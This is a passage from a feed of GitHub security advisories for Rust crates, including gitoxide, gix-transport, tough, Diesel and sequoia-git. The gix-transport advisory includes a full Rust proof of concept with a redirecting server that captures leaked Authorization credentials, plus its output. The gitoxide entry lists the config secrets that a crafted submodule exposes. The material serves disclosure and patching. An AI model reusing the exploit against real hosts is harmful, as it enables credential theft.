<li><p>Victim clones the repository using a tool built on gitoxide.</p>
</li>
<li><p>When the tool iterates submodules and calls <code>submodule.open()</code> or <code>submodule.status()</code>:</p>
<ul>
<li><code>git_dir()</code> returns <code>.git/modules/x..y/../../..</code> which resolves to the parent <code>.git/</code></li>
<li><code>open_opts()</code> is called with <code>Trust::Full</code> (inherited from parent, ownership check skipped)</li>
<li>The parent's <code>.git/config</code> is fully parsed</li>
</ul>
</li>
<li><p>The returned <code>Repository</code> object exposes all config values from the traversed path:</p>
<ul>
<li><code>remote.origin.url</code> (may contain <code>https://user:token@github.com/...</code>)</li>
<li><code>http.extraHeader</code> (often <code>Authorization: Bearer &lt;token&gt;</code>)</li>
<li><code>credential.*</code> sections</li>
<li><code>core.sshCommand</code></li>
</ul>
</li>
<li><p>Accessible via standard API: <code>repo.config_snapshot().string("http.extraHeader")</code>, <code>repo.find_remote("origin")</code>, etc.</p>
</li>
</ol>
<h3 id="impact">Impact</h3>
<p>A crafted <code>.gitmodules</code> in a malicious repository causes gitoxide to open arbitrary git directories as submodule repositories with full trust, exposing their configuration including credentials. This is the same class of vulnerability as GHSA-7w47-3wg8-547c (path traversal), but through the submodule name vector with an additional trust bypass.</p>
<p>The trust inheritance is the critical amplifier: without it, the traversed path would undergo ownership checks that could block the attack. With it, any git directory reachable via <code>../</code> is opened with full trust.</p>
<h3 id="honest-limitations">Honest limitations</h3>
<ul>
<li>The traversed path must be a valid git directory (HEAD, objects/, refs/ must exist)</li>
<li>The victim's tool must call <code>open()</code> or <code>status()</code> on submodules (tools that only list submodules are not affected)</li>
<li>Credential exposure requires the target config to contain embedded credentials</li>
<li>Submodule operations currently require explicit user action</li>
</ul>
<h3 id="suggested-fix">Suggested fix</h3>
<ol>
<li>Fix the validation to check ALL <code>..</code> occurrences (iterate, not single <code>find</code>)</li>
<li>Call <code>gix_validate::submodule::name()</code> in <code>git_dir()</code> before constructing the path</li>
<li>Do NOT inherit <code>git_dir_trust</code> from parent when opening submodule repos -- always re-derive trust from path ownership</li>
</ol>
<h3 id="severity">Severity</h3>
<p>High. Network vector (via clone), requires user interaction (submodule operations). The trust bypass enables credential disclosure from traversed git directories. Confidentiality impact is high.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/GitoxideLabs/gitoxide/security/advisories/GHSA-p3hw-mv63-rf9w">https://github.com/GitoxideLabs/gitoxide/security/advisories/GHSA-p3hw-mv63-rf9w</a></li>
<li><a href="https://github.com/advisories/GHSA-p3hw-mv63-rf9w">https://github.com/advisories/GHSA-p3hw-mv63-rf9w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-p3hw-mv63-rf9w</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-05T19:20:38.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[gix-transport] gix-transport: HTTP credentials leaked to redirected host in curl backend]]></title>
        <id>https://github.com/advisories/GHSA-9857-6mw7-fq2m</id>
        <link href="https://github.com/advisories/GHSA-9857-6mw7-fq2m"/>
        <updated>2026-05-05T19:16:36.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The curl-based HTTP transport in <code>gix-transport</code> sends user credentials (passwords, tokens) to an attacker-controlled server after an HTTP redirect. When a server responds with a 302 redirect during the initial <code>GET /info/refs</code>, gitoxide records the redirected base URL and rewrites all subsequent requests to point at the redirected host. The <code>Authorization</code> header is still attached because <code>add_basic_auth_if_present()</code> only checks <code>self.url</code> (the original, never-updated URL).</p>
<p>The reqwest backend is not affected. Its custom redirect policy at <code>reqwest/remote.rs</code> lines 60-64 compares <code>prev_url.host_str()</code> to <code>curr_url.host_str()</code> and calls <code>attempt.stop()</code> on cross-domain redirects, so <code>redirected_base_url</code> is never set to a different host.</p>
<h2 id="details">Details</h2>
<p>The vulnerability involves two components in <code>gix-transport</code>:</p>
<p><strong>1. URL rewriting after redirect</strong> (<a href="https://github.com/GitoxideLabs/gitoxide/blob/main/gix-transport/src/client/blocking_io/http/curl/remote.rs">gix-transport/src/client/blocking_io/http/curl/remote.rs</a>)</p>
<p>After a request completes, the effective URL is compared to the requested URL. If they differ (redirect occurred), the new base URL is stored (lines 355-359). On subsequent requests, <code>swap_tails()</code> rewrites the target URL to point at the redirected host (line 166).</p>
<p><strong>2. Credential check uses original URL</strong> (<a href="https://github.com/GitoxideLabs/gitoxide/blob/main/gix-transport/src/client/blocking_io/http/mod.rs#L293">gix-transport/src/client/blocking_io/http/mod.rs, lines 293-312</a>)</p>
<p><code>add_basic_auth_if_present()</code> checks <code>self.url</code> (set once during construction, never mutated) to decide whether to attach credentials. Since <code>self.url</code> always points to the original host, credentials are approved even when the actual request goes to the redirected (attacker) host.</p>
<p>The <code>Authorization</code> header is added to the headers list in <code>handshake()</code> (line 374) and <code>request()</code> (line 434) before being passed to the backend, which applies them to the rewritten URL via <code>handle.http_headers(headers)</code> (line 309).</p>
<h3 id="attack-flow-cross-domain-credential-leak">Attack flow: cross-domain credential leak</h3>
<ol>
<li>Victim clones <code>https://legitimate.com/repo</code> with credentials configured</li>
<li>Server returns 302 redirect on <code>GET /info/refs</code> to <code>https://attacker.com/...</code></li>
<li>Curl follows the redirect and strips <code>Authorization</code> for this GET (safe so far)</li>
<li>Attacker serves a valid info/refs response; <code>redirected_base_url</code> is set</li>
<li><code>POST /git-upload-pack</code> is rewritten via <code>swap_tails()</code> to <code>attacker.com</code></li>
<li><code>add_basic_auth_if_present()</code> checks <code>self.url</code> (still <code>legitimate.com</code>), approves credential sending</li>
<li><code>Authorization: Basic &lt;credentials&gt;</code> is sent to <code>attacker.com</code></li>
</ol>
<p>Curl's cross-domain header stripping only protects the redirected GET. It does not protect the POST, which is a new request with credentials re-attached by gitoxide.</p>
<h3 id="secondary-vector-https-to-http-downgrade">Secondary vector: HTTPS-to-HTTP downgrade</h3>
<p>The cleartext protection at <code>mod.rs</code> line 300-305 also checks <code>self.url</code>:</p>
<pre><code class="language-rust">if self.url.starts_with("http://") {
    return Err(client::Error::AuthenticationRefused("..."));
}
</code></pre>
<p>This only validates the original URL's scheme, not the effective URL after redirect. A redirect from <code>https://legitimate.com</code> to <code>http://attacker.com</code> bypasses this check, causing credentials to be sent in cleartext over HTTP.</p>
<ol>
<li>Victim clones <code>https://legitimate.com/repo</code> with credentials</li>
<li>Server redirects to <code>http://attacker.com/...</code> (note: HTTP, not HTTPS)</li>
<li><code>add_basic_auth_if_present()</code> checks <code>self.url</code> (still <code>https://</code>), allows credentials</li>
<li><code>Authorization</code> header is sent over unencrypted HTTP to <code>attacker.com</code></li>
</ol>
<h2 id="poc">PoC</h2>
<p>A complete Rust project that reproduces the issue. It starts two local TCP servers (legitimate on :8080, attacker on :9090) and uses <code>gix-transport</code> to demonstrate the credential leak.</p>
<p><strong>To run:</strong> Create the project next to the gitoxide checkout so path dependencies resolve, then <code>cargo run</code>.</p>
<details>
<summary>Cargo.toml</summary>

<pre><code class="language-toml">[package]
name = "poc-gitoxide-redirect"
version = "0.1.0"
edition = "2021"

[dependencies]
# http-client-insecure-credentials is only needed because the PoC uses http://
# to avoid TLS setup. A real attack would use https:// and not require this feature.
gix-transport = { path = "../gitoxide/gix-transport", features = ["http-client-curl", "http-client-insecure-credentials"] }
gix-sec = { path = "../gitoxide/gix-sec" }
gix-url = { path = "../gitoxide/gix-url" }
gix-packetline = { path = "../gitoxide/gix-packetline", features = ["blocking-io"] }
</code></pre>
</details>

<details>
<summary>src/main.rs</summary>

<pre><code class="language-rust">use std::io::{BufRead, BufReader, Write};
use std::net::TcpListener;
use std::sync::mpsc;
use std::thread;

use gix_transport::client::{self, blocking_io::http, blocking_io::Transport, TransportWithoutIO};

fn main() {
    println!("=== gitoxide HTTP credential leak via redirect ===\n");

    let (captured_tx, captured_rx) = mpsc::channel::&lt;Vec&lt;String&gt;&gt;();

    // Attacker server (port 9090): captures credentials
    let attacker = TcpListener::bind("127.0.0.1:9090").expect("bind attacker");
    let attacker_handle = thread::spawn(move || {
        let (mut conn1, _) = attacker.accept().expect("accept conn1");
        let mut reader1 = BufReader::new(conn1.try_clone().unwrap());
        let mut headers1 = Vec::new();
        loop {
            let mut line = String::new();
            reader1.read_line(&amp;mut line).unwrap();
            if line.trim().is_empty() { break; }
            headers1.push(line.trim().to_string());
        }
        println!("[attacker] GET /info/refs headers (from redirect):");
        for h in &amp;headers1 { println!("  {h}"); }

        let pkt_service = "001e# service=git-upload-pack\n";
        let pkt_flush = "0000";
        let fake_hash = "a".repeat(40);
        let caps = "multi_ack thin-pack side-band side-band-64k ofs-delta shallow no-progress include-tag";
        let ref_line = format!("{fake_hash} HEAD\0{caps}\n");
        let ref_pkt = format!("{:04x}{ref_line}", ref_line.len() + 4);
        let body = format!("{pkt_service}{pkt_flush}{ref_pkt}{pkt_flush}");
        let response = format!(
            "HTTP/1.1 200 OK\r\nContent-Type: application/x-git-upload-pack-advertisement\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
            body.len()
        );
        conn1.write_all(response.as_bytes()).unwrap();
        conn1.flush().unwrap();
        drop(conn1);

        let (mut conn2, _) = attacker.accept().expect("accept conn2");
        let mut reader2 = BufReader::new(conn2.try_clone().unwrap());
        let mut headers2 = Vec::new();
        let mut content_length: usize = 0;
        loop {
            let mut line = String::new();
            reader2.read_line(&amp;mut line).unwrap();
            if line.trim().is_empty() { break; }
            let trimmed = line.trim().to_string();
            if let Some(cl) = trimmed.strip_prefix("Content-Length: ") {
                content_length = cl.parse().unwrap_or(0);
            }
            headers2.push(trimmed);
        }
        if content_length &gt; 0 {
            let mut body_buf = vec![0u8; content_length];
            use std::io::Read;
            reader2.read_exact(&amp;mut body_buf).ok();
        }

        println!("\n[attacker] POST /git-upload-pack headers:");
        for h in &amp;headers2 {
            let prefix = if h.starts_with("Authorization:") { "  &gt;&gt;&gt; LEAKED: " } else { "  " };
            println!("{prefix}{h}");
        }

        let resp_body = "0000";
        let response2 = format!(
            "HTTP/1.1 200 OK\r\nContent-Type: application/x-git-upload-pack-result\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{resp_body}",
            resp_body.len()
        );
        conn2.write_all(response2.as_bytes()).unwrap();
        conn2.flush().unwrap();
        drop(conn2);

        captured_tx.send(headers2).ok();
    });

    // Legitimate server (port 8080): redirects to attacker
    let legit = TcpListener::bind("127.0.0.1:8080").expect("bind legit");
    let legit_handle = thread::spawn(move || {
        let (mut conn, _) = legit.accept().expect("accept legit");
        let mut reader = BufReader::new(conn.try_clone().unwrap());
        let mut request_line = String::new();
        reader.read_line(&amp;mut request_line).unwrap();
        println!("[legit] Received: {}", request_line.trim());
        loop {
            let mut line = String::new();
            reader.read_line(&amp;mut line).unwrap();
            if line.trim().is_empty() { break; }
        }
        let redirect_url = "http://127.0.0.1:9090/repo.git/info/refs?service=git-upload-pack";
        let response = format!(
            "HTTP/1.1 302 Found\r\nLocation: {redirect_url}\r\nContent-Length: 0\r\n\r\n"
        );
        conn.write_all(response.as_bytes()).unwrap();
        conn.flush().unwrap();
        println!("[legit] Sent 302 redirect to attacker server");
    });

    thread::sleep(std::time::Duration::from_millis(100));

    println!("\n[client] Connecting to http://127.0.0.1:8080/repo.git with credentials...");
    let url: gix_url::Url = "http://127.0.0.1:8080/repo.git".try_into().expect("parse url");
    let mut transport: http::Transport&lt;http::curl::Curl&gt; =
        http::connect(url, gix_transport::Protocol::V1, false);
    transport
        .set_identity(gix_sec::identity::Account {
            username: "victim-user".into(),
            password: "super-secret-token".into(),
            oauth_refresh_token: None,
        })
        .expect("set identity");

    println!("[client] Performing handshake (GET /info/refs)...");
    match transport.handshake(gix_transport::Service::UploadPack, &amp;[]) {
        Ok(_) =&gt; println!("[client] Handshake succeeded"),
        Err(e) =&gt; println!("[client] Handshake error: {e}"),
    }

    println!("[client] Sending request (POST /git-upload-pack)...");
    match transport.request(client::WriteMode::Binary, client::MessageKind::Flush, false) {
        Ok(_writer) =&gt; println!("[client] Request sent"),
        Err(e) =&gt; println!("[client] Request error: {e}"),
    }

    legit_handle.join().ok();
    attacker_handle.join().ok();

    println!("\n=== RESULT ===");
    if let Ok(headers) = captured_rx.recv_timeout(std::time::Duration::from_secs(2)) {
        let leaked = headers.iter().any(|h| h.starts_with("Authorization:"));
        if leaked {
            let auth = headers.iter().find(|h| h.starts_with("Authorization:")).unwrap();
            println!("VULNERABLE: Credentials leaked to attacker server!");
            println!("Captured: {auth}");
        } else {
            println!("NOT VULNERABLE: No credentials captured.");
        }
    } else {
        println!("ERROR: Timed out.");
    }
}
</code></pre>
</details>

<p><strong>Output:</strong></p>
<pre><code>[attacker] GET /info/refs headers (from redirect):
  GET /repo.git/info/refs?service=git-upload-pack HTTP/1.1
  Host: 127.0.0.1:9090
  Accept: */*
  User-Agent: git/oxide-0.55.0

[attacker] POST /git-upload-pack headers:
  POST /repo.git/git-upload-pack HTTP/1.1
  Host: 127.0.0.1:9090
  &gt;&gt;&gt; LEAKED: Authorization: Basic dmljdGltLXVzZXI6c3VwZXItc2VjcmV0LXRva2Vu

VULNERABLE: Credentials leaked to attacker server!
Captured: Authorization: Basic dmljdGltLXVzZXI6c3VwZXItc2VjcmV0LXRva2Vu
</code></pre>
<p>The GET (from redirect) has no <code>Authorization</code> header. The POST carries the full credentials. The base64 decodes to <code>victim-user:super-secret-token</code>.</p>
<h2 id="impact">Impact</h2>
<p>Any user who clones or fetches over HTTP(S) using gitoxide with the curl backend (<code>http-client-curl</code> feature) can have their credentials stolen by an attacker who controls a redirect target (via compromised server, DNS hijacking, or MITM). The only user interaction required is initiating the clone or fetch; the redirect and credential leak happen transparently. CI/CD pipelines using tokens are also at risk.</p>
<h2 id="suggested-fix">Suggested Fix</h2>
<ol>
<li>Only attach <code>Authorization</code> if the effective URL's host matches the original URL's host.</li>
<li>Or block cross-origin redirects in the curl backend, matching reqwest's behavior.</li>
<li>Check the effective URL's scheme (not the original) for the HTTPS-to-HTTP downgrade.</li>
</ol>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/GitoxideLabs/gitoxide/security/advisories/GHSA-9857-6mw7-fq2m">https://github.com/GitoxideLabs/gitoxide/security/advisories/GHSA-9857-6mw7-fq2m</a></li>
<li><a href="https://github.com/advisories/GHSA-9857-6mw7-fq2m">https://github.com/advisories/GHSA-9857-6mw7-fq2m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9857-6mw7-fq2m</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-05T19:16:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tuftool] awslabs/tough is Missing Delegated Metadata Validation]]></title>
        <id>https://github.com/advisories/GHSA-4v58-8p28-2rq3</id>
        <link href="https://github.com/advisories/GHSA-4v58-8p28-2rq3"/>
        <updated>2026-05-05T18:46:50.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Missing expiration, hash, and length enforcement in delegated metadata validation in awslabs/tough before tough-v0.22.0 allows remote authenticated users with delegated signing authority to bypass TUF specification integrity checks for delegated targets metadata and poison the local metadata cache, because load_delegations does not apply the same validation checks as the top-level targets metadata path.</p>
<h3 id="impact">Impact</h3>
<p>The tough library, prior to 0.22.0, does not properly verify delegated target metadata. It allows someone with write access to the metadata to serve expired or otherwise invalid targets from a TUF repository which tough will then trust rather than reject.</p>
<h3 id="impacted-versions">Impacted Versions:</h3>
<p>tough 0.9.0 through 0.21.x, tuftool through 0.14.x</p>
<h3 id="patches">Patches</h3>
<p>This issue has been addressed in tough version 0.22.0 and tuftool version 0.15.0. We recommend upgrading to the latest version and ensuring any forked or derivative code is patched to incorporate the new fixes. </p>
<h3 id="workarounds">Workarounds</h3>
<p>No workarounds to this issue are known.</p>
<h3 id="references">References</h3>
<ul>
<li>CVE-2026-6967
If there are any questions or comments about this advisory, please contact [AWS/Amazon] Security via the <a href="https://aws.amazon.com/security/vulnerability-reporting">vulnerability reporting page</a> or directly via email to <a href="mailto:aws-security@amazon.com">aws-security@amazon.com</a>. Please do not create a public GitHub issue.</li>
</ul>
<h3 id="acknowledgement">Acknowledgement</h3>
<p>Amazon Web Services Labs would like to thank Oleh Konko of 1seal for collaborating on this issue through the coordinated vulnerability disclosure process.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/awslabs/tough/security/advisories/GHSA-4v58-8p28-2rq3">https://github.com/awslabs/tough/security/advisories/GHSA-4v58-8p28-2rq3</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-6967">https://nvd.nist.gov/vuln/detail/CVE-2026-6967</a></li>
<li><a href="https://aws.amazon.com/security/security-bulletins/2026-019-aws">https://aws.amazon.com/security/security-bulletins/2026-019-aws</a></li>
<li><a href="https://crates.io/crates/tough/0.22.0">https://crates.io/crates/tough/0.22.0</a></li>
<li><a href="https://crates.io/crates/tuftool/0.15.0">https://crates.io/crates/tuftool/0.15.0</a></li>
<li><a href="https://github.com/awslabs/tough/releases/tag/tough-v0.22.0">https://github.com/awslabs/tough/releases/tag/tough-v0.22.0</a></li>
<li><a href="https://github.com/awslabs/tough/releases/tag/tuftool-v0.15.0">https://github.com/awslabs/tough/releases/tag/tuftool-v0.15.0</a></li>
<li><a href="https://github.com/advisories/GHSA-4v58-8p28-2rq3">https://github.com/advisories/GHSA-4v58-8p28-2rq3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4v58-8p28-2rq3</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-05T18:46:48.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tough] awslabs/tough is Missing Delegated Metadata Validation]]></title>
        <id>https://github.com/advisories/GHSA-4v58-8p28-2rq3</id>
        <link href="https://github.com/advisories/GHSA-4v58-8p28-2rq3"/>
        <updated>2026-05-05T18:46:50.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Missing expiration, hash, and length enforcement in delegated metadata validation in awslabs/tough before tough-v0.22.0 allows remote authenticated users with delegated signing authority to bypass TUF specification integrity checks for delegated targets metadata and poison the local metadata cache, because load_delegations does not apply the same validation checks as the top-level targets metadata path.</p>
<h3 id="impact">Impact</h3>
<p>The tough library, prior to 0.22.0, does not properly verify delegated target metadata. It allows someone with write access to the metadata to serve expired or otherwise invalid targets from a TUF repository which tough will then trust rather than reject.</p>
<h3 id="impacted-versions">Impacted Versions:</h3>
<p>tough 0.9.0 through 0.21.x, tuftool through 0.14.x</p>
<h3 id="patches">Patches</h3>
<p>This issue has been addressed in tough version 0.22.0 and tuftool version 0.15.0. We recommend upgrading to the latest version and ensuring any forked or derivative code is patched to incorporate the new fixes. </p>
<h3 id="workarounds">Workarounds</h3>
<p>No workarounds to this issue are known.</p>
<h3 id="references">References</h3>
<ul>
<li>CVE-2026-6967
If there are any questions or comments about this advisory, please contact [AWS/Amazon] Security via the <a href="https://aws.amazon.com/security/vulnerability-reporting">vulnerability reporting page</a> or directly via email to <a href="mailto:aws-security@amazon.com">aws-security@amazon.com</a>. Please do not create a public GitHub issue.</li>
</ul>
<h3 id="acknowledgement">Acknowledgement</h3>
<p>Amazon Web Services Labs would like to thank Oleh Konko of 1seal for collaborating on this issue through the coordinated vulnerability disclosure process.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/awslabs/tough/security/advisories/GHSA-4v58-8p28-2rq3">https://github.com/awslabs/tough/security/advisories/GHSA-4v58-8p28-2rq3</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-6967">https://nvd.nist.gov/vuln/detail/CVE-2026-6967</a></li>
<li><a href="https://aws.amazon.com/security/security-bulletins/2026-019-aws">https://aws.amazon.com/security/security-bulletins/2026-019-aws</a></li>
<li><a href="https://crates.io/crates/tough/0.22.0">https://crates.io/crates/tough/0.22.0</a></li>
<li><a href="https://crates.io/crates/tuftool/0.15.0">https://crates.io/crates/tuftool/0.15.0</a></li>
<li><a href="https://github.com/awslabs/tough/releases/tag/tough-v0.22.0">https://github.com/awslabs/tough/releases/tag/tough-v0.22.0</a></li>
<li><a href="https://github.com/awslabs/tough/releases/tag/tuftool-v0.15.0">https://github.com/awslabs/tough/releases/tag/tuftool-v0.15.0</a></li>
<li><a href="https://github.com/advisories/GHSA-4v58-8p28-2rq3">https://github.com/advisories/GHSA-4v58-8p28-2rq3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4v58-8p28-2rq3</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-05T18:46:48.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tuftool] awslabs/tough Delegated Roles have a Signature Threshold Bypass]]></title>
        <id>https://github.com/advisories/GHSA-8m7c-8m39-rv4x</id>
        <link href="https://github.com/advisories/GHSA-8m7c-8m39-rv4x"/>
        <updated>2026-05-05T18:46:10.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Improper verification of cryptographic signature uniqueness in delegated role validation in awslabs/tough before tough-v0.22.0 allows remote authenticated users to bypass the TUF signature threshold requirement by duplicating a valid signature, causing the client to accept forged delegated role metadata.</p>
<h3 id="impact">Impact</h3>
<p>The tough library, prior to 0.22.0, does not properly verify the uniqueness of keys in the signatures provided to meet the threshold of cryptographic signatures in delegated targets. It allows actors with access to a valid signing key to create multiple valid signatures in order to circumvent TUF requiring a minimum threshold of unique keys before the metadata is considered valid.</p>
<h3 id="patches">Patches</h3>
<p>This issue has been addressed in tough version 0.22.0 and tuftool version 0.15.0. We recommend upgrading to the latest version and ensuring any forked or derivative code is patched to incorporate the new fixes. </p>
<h3 id="workarounds">Workarounds</h3>
<p>No workarounds to this issue are known.</p>
<h3 id="references">References</h3>
<ul>
<li>CVE-2026-6966</li>
</ul>
<p>If there are any questions or comments about this advisory, please contact [AWS/Amazon] Security via the <a href="https://aws.amazon.com/security/vulnerability-reporting">vulnerability reporting page</a> or directly via email to <a href="mailto:aws-security@amazon.com">aws-security@amazon.com</a>. Please do not create a public GitHub issue.</p>
<h3 id="acknowledgement">Acknowledgement</h3>
<p>Amazon Web Services Labs would like to thank Emily Albini of Oxide Computer and Oleh Konko of 1seal for collaborating on this issue through the coordinated vulnerability disclosure process</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/awslabs/tough/security/advisories/GHSA-8m7c-8m39-rv4x">https://github.com/awslabs/tough/security/advisories/GHSA-8m7c-8m39-rv4x</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-6966">https://nvd.nist.gov/vuln/detail/CVE-2026-6966</a></li>
<li><a href="https://aws.amazon.com/security/security-bulletins/2026-019-aws">https://aws.amazon.com/security/security-bulletins/2026-019-aws</a></li>
<li><a href="https://crates.io/crates/tough/0.22.0">https://crates.io/crates/tough/0.22.0</a></li>
<li><a href="https://crates.io/crates/tuftool/0.15.0">https://crates.io/crates/tuftool/0.15.0</a></li>
<li><a href="https://github.com/awslabs/tough/releases/tag/tough-v0.22.0">https://github.com/awslabs/tough/releases/tag/tough-v0.22.0</a></li>
<li><a href="https://github.com/awslabs/tough/releases/tag/tuftool-v0.15.0">https://github.com/awslabs/tough/releases/tag/tuftool-v0.15.0</a></li>
<li><a href="https://github.com/advisories/GHSA-8m7c-8m39-rv4x">https://github.com/advisories/GHSA-8m7c-8m39-rv4x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8m7c-8m39-rv4x</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-05T18:46:09.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tough] awslabs/tough Delegated Roles have a Signature Threshold Bypass]]></title>
        <id>https://github.com/advisories/GHSA-8m7c-8m39-rv4x</id>
        <link href="https://github.com/advisories/GHSA-8m7c-8m39-rv4x"/>
        <updated>2026-05-05T18:46:10.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Improper verification of cryptographic signature uniqueness in delegated role validation in awslabs/tough before tough-v0.22.0 allows remote authenticated users to bypass the TUF signature threshold requirement by duplicating a valid signature, causing the client to accept forged delegated role metadata.</p>
<h3 id="impact">Impact</h3>
<p>The tough library, prior to 0.22.0, does not properly verify the uniqueness of keys in the signatures provided to meet the threshold of cryptographic signatures in delegated targets. It allows actors with access to a valid signing key to create multiple valid signatures in order to circumvent TUF requiring a minimum threshold of unique keys before the metadata is considered valid.</p>
<h3 id="patches">Patches</h3>
<p>This issue has been addressed in tough version 0.22.0 and tuftool version 0.15.0. We recommend upgrading to the latest version and ensuring any forked or derivative code is patched to incorporate the new fixes. </p>
<h3 id="workarounds">Workarounds</h3>
<p>No workarounds to this issue are known.</p>
<h3 id="references">References</h3>
<ul>
<li>CVE-2026-6966</li>
</ul>
<p>If there are any questions or comments about this advisory, please contact [AWS/Amazon] Security via the <a href="https://aws.amazon.com/security/vulnerability-reporting">vulnerability reporting page</a> or directly via email to <a href="mailto:aws-security@amazon.com">aws-security@amazon.com</a>. Please do not create a public GitHub issue.</p>
<h3 id="acknowledgement">Acknowledgement</h3>
<p>Amazon Web Services Labs would like to thank Emily Albini of Oxide Computer and Oleh Konko of 1seal for collaborating on this issue through the coordinated vulnerability disclosure process</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/awslabs/tough/security/advisories/GHSA-8m7c-8m39-rv4x">https://github.com/awslabs/tough/security/advisories/GHSA-8m7c-8m39-rv4x</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-6966">https://nvd.nist.gov/vuln/detail/CVE-2026-6966</a></li>
<li><a href="https://aws.amazon.com/security/security-bulletins/2026-019-aws">https://aws.amazon.com/security/security-bulletins/2026-019-aws</a></li>
<li><a href="https://crates.io/crates/tough/0.22.0">https://crates.io/crates/tough/0.22.0</a></li>
<li><a href="https://crates.io/crates/tuftool/0.15.0">https://crates.io/crates/tuftool/0.15.0</a></li>
<li><a href="https://github.com/awslabs/tough/releases/tag/tough-v0.22.0">https://github.com/awslabs/tough/releases/tag/tough-v0.22.0</a></li>
<li><a href="https://github.com/awslabs/tough/releases/tag/tuftool-v0.15.0">https://github.com/awslabs/tough/releases/tag/tuftool-v0.15.0</a></li>
<li><a href="https://github.com/advisories/GHSA-8m7c-8m39-rv4x">https://github.com/advisories/GHSA-8m7c-8m39-rv4x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8m7c-8m39-rv4x</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-05T18:46:09.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[diesel] Diesel's SQLite backend has possible UTF-8 corruption]]></title>
        <id>https://github.com/advisories/GHSA-h5x4-m2qf-r4f2</id>
        <link href="https://github.com/advisories/GHSA-h5x4-m2qf-r4f2"/>
        <updated>2026-05-05T18:08:05.000Z</updated>
        <content type="html"><![CDATA[<p>Diesel uses the <code>sqlite3_value_text</code> function to receive strings from SQLite while deserializing query results. We misinterpreted the corresponding <a href="https://sqlite.org/c3ref/value_blob.html">SQLite</a> documentation that this function always returns a UTF-8 encoded string values as <code>*const c_char</code>. Based on that we used <code>str::from_utf8_unchecked</code> to construct a Rust string slice without any additional UTF-8 checks in place. It turned out that this function doesn't always return correct UTF-8 strings. For field of the SQLite side storage type <code>BLOB</code> this pointer can contain arbitrary bytes, which makes the usage of <code>str::from_utf8_unchecked</code> unsound as this violates the safety contract of <code>str</code> to only contain valid UTF-8 encoded Strings.</p>
<h2 id="mitigation">Mitigation</h2>
<p>The preferred mitigation to the outlined problem is to update to a Diesel version 2.3.8 or newer, which includes fixes for the problem.</p>
<h2 id="resolution">Resolution</h2>
<p>Diesel now correctly checks whether the provides byte buffer is actually valid UTF-8, instead of relying on SQLite's documentation. This fix is included in the <code>2.3.8</code> release.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/diesel-rs/diesel/pull/5042">https://github.com/diesel-rs/diesel/pull/5042</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2026-0111.html">https://rustsec.org/advisories/RUSTSEC-2026-0111.html</a></li>
<li><a href="https://github.com/advisories/GHSA-h5x4-m2qf-r4f2">https://github.com/advisories/GHSA-h5x4-m2qf-r4f2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-h5x4-m2qf-r4f2</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-05T18:08:05.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[sequoia-git] sequoia-git has broken hard revocation handling]]></title>
        <id>https://github.com/advisories/GHSA-g27r-r6ph-vf5r</id>
        <link href="https://github.com/advisories/GHSA-g27r-r6ph-vf5r"/>
        <updated>2026-05-04T22:28:52.000Z</updated>
        <content type="html"><![CDATA[<p>Before <code>sq-git</code> checks if a commit can be authenticated, it first looks for hard revocations.  Because parsing a policy is expensive
and a project's policy rarely changes, <code>sq-git</code> has an optimization to only check a policy if it hasn't checked it before.  It does this by maintaining a set of policies that it had already seen keyed on the policy's hash.  Unfortunately, due to a bug the hash was truncated to be 0 bytes and thus only hard revocations in the target commit were considered.  Normally this is not a problem as hard revocations are not removed from the signing policy.</p>
